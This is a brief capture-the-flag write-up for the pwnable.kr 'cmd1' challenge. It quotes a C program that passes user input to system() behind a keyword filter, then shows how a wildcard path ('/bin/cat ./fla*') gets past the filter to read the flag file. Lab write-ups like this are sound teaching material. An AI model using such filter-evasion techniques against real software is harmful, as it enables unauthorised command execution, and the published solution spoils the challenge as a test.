# Description
Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)

# Exploitation
```c
int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}

if(filter(argv[1])) return 0;
system( argv[1] );
```
This code checks whether argv[1] contain 'flag', 'sh', 'tmp' or not.

To get shell or get flag, Almost try to pass argv[1] as 'cat flag' or 'sh'.

To bypass that, I used '/bin/cat ./fl*' then it can bypass 'flag' word check.

```
cmd1@ubuntu:~$ ./cmd1 "/bin/cat ./fla*"
mommy now I get what PATH environment is for :)
cmd1@ubuntu:~$
```
